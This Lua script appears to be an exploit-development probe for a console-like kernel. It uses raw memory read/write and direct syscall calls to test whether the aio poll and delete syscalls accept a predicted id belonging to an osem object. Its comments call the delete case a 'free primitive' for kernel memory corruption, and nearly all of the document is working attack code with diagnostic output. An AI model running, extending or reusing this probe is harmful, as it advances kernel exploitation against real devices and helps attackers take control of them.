-- CRASH_CLASS: HIGH
-- PROBE 812a: does a syscall of one family accept an object id of another?
--
-- aio (669) and osem (549) both register into the same table at proc+0xc48 and
-- both take ids from 0x8ad598e0.  669 returns its id to userland; 549 does not,
-- but the generator is sequential (811a: ids advanced by exactly one per
-- create), so an osem object created immediately after a known aio id lands on
-- the next slot.  If a lookup checks only slot+generation, then 664/662 on an
-- osem id resolves an osem object and reads/frees aio fields out of it.

print("=== PROBE 812a: CROSS-FAMILY OBJECT IDS ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end
    return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function hex(v) if v==nil then return "nil" end return string.format("%08X", v) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sc_create = mk(669)
local sc_poll   = mk(664)
local sc_delete = mk(662)
local sc_osenew = mk(549)
local sc_osedel = mk(550)

local data = memory.alloc(0x100)
local out_id = memory.alloc(0x40)
local cell = memory.alloc(16)
local poll_out = memory.alloc(0x40)
local stat = memory.alloc(0x40)
local nm = memory.alloc(0x40)

local function wname(s)
    for i = 1, #s do pcall(function() memory.write_byte(nm + i - 1, s:byte(i)) end) end
    pcall(function() memory.write_byte(nm + #s, 0) end)
end

local function aio_create()
    for i = 0, 0xFC, 4 do wd(N(data) + i, 0) end
    wq(N(out_id), uint64(0))
    local ok, rv = pcall(function()
        return sc_create(uint64(1), uint64(N(data)), uint64(1), uint64(1), uint64(N(out_id)))
    end)
    if not ok then return nil, "pcall" end
    if N(rv) ~= 0 then return nil, N(rv) end
    local id = rd(N(out_id))
    wd(N(cell), id)
    wd(N(poll_out), 0xCCCCCCCC)
    pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
    return id
end

local function aio_poll(id)
    wd(N(cell), id); wd(N(poll_out), 0xCCCCCCCC)
    local ok, rv = pcall(function() return sc_poll(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
    return ok and N(rv) or "pcall", rd(N(poll_out))
end

local function aio_delete(id)
    wd(N(cell), id); wd(N(stat), 0xCCCCCCCC)
    local ok, rv = pcall(function() return sc_delete(uint64(N(cell)), uint64(1), uint64(N(stat))) end)
    return ok and N(rv) or "pcall", rd(N(stat))
end

local function osem_create(name, flags, a3, a4)
    wname(name)
    local ok, rv = pcall(function()
        return sc_osenew(uint64(nm), uint64(flags), uint64(a3), uint64(a4))
    end)
    return ok and N(rv) or "pcall"
end

local function osem_delete(id)
    local ok, rv = pcall(function() return sc_osedel(uint64(id), uint64(0), uint64(0), uint64(0)) end)
    return ok and N(rv) or "pcall"
end

-- [A] three sequential creates: aio id, osem id (predicted = aio+1), aio id
print("[A] sequential creates")
local A = aio_create()
print("    aio  A = " .. hex(A))
local o1 = osem_create("xyz812a", 1, 0, 4)
print("    osem   = " .. tostring(o1) .. "   (predicted id " .. hex((A or 0) + 1) .. ")")
local C = aio_create()
print("    aio  C = " .. hex(C))
if not A or not C then print("    create failed; aborting"); return end
local B = A + 1
if C ~= B + 1 then
    print(string.format("    NOTE: counter advanced by %d, so the osem id may not be A+1", C - A))
end
print(string.format("    treating osem id B = %s", hex(B)))

-- [B] osem delete on an aio object
print("")
print("[B] 550 (osem delete) on the aio id A")
local r = osem_delete(A)
print("    550(A) = " .. tostring(r) .. "   alive=" .. tostring(alive()))
local p, s = aio_poll(A)
print("    664(A) = " .. tostring(p) .. " status=" .. hex(s))

-- [C] aio poll on the osem id
print("")
print("[C] 664 (aio poll) on the osem id B")
local p2, s2 = aio_poll(B)
print("    664(B) = " .. tostring(p2) .. " status=" .. hex(s2) .. "   alive=" .. tostring(alive()))

-- [D] aio poll on a definitely-unused id
print("")
print("[D] control: 664 on an id that was never created")
local p3, s3 = aio_poll(A + 0x700)
print("    664(A+0x700) = " .. tostring(p3) .. " status=" .. hex(s3) .. "   alive=" .. tostring(alive()))

-- [E] aio delete on the osem id  <-- the free primitive if the lookup accepts it
print("")
print("[E] 662 (aio delete) on the osem id B")
local d2, ds2 = aio_delete(B)
print("    662(B) = " .. tostring(d2) .. " status=" .. hex(ds2) .. "   alive=" .. tostring(alive()))

-- [F] did the osem object survive?  a second osem delete answers 0 either way,
--     so create a fresh osem and check the table still works
print("")
print("[F] health: fresh creates")
local A2 = aio_create()
print("    aio  A2 = " .. hex(A2))
local o2 = osem_create("xyz812b", 1, 0, 4)
print("    osem   = " .. tostring(o2))
local B2 = (A2 or 0) + 1
local d3, ds3 = aio_delete(B2)
print("    662(B2) = " .. tostring(d3) .. " status=" .. hex(ds3) .. "   alive=" .. tostring(alive()))
print("")
print("[*] alive pid=" .. N(native.fcall_with_rax(stub, 20)))
